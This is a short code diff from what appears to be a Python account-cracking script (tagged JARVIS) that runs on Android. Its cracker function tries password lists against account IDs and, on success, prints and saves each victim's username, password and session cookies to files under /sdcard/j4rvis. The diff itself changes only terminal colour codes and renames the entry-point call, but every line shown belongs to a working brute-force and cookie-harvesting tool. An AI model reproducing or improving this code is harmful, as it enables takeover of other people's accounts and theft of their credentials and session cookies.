@@ -399,14 +399,14 @@ def cracker(ids,passlist):
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
                         print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \x1b[38;5;197m"+kuki)
                         open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
                     else:
                         print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \x1b[38;5;197m"+kuki)
                         open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
@@ -554,4 +554,4 @@ def crackerr(ids,passlist):
         pass
 
 
-__iam_a_porche()
+m()
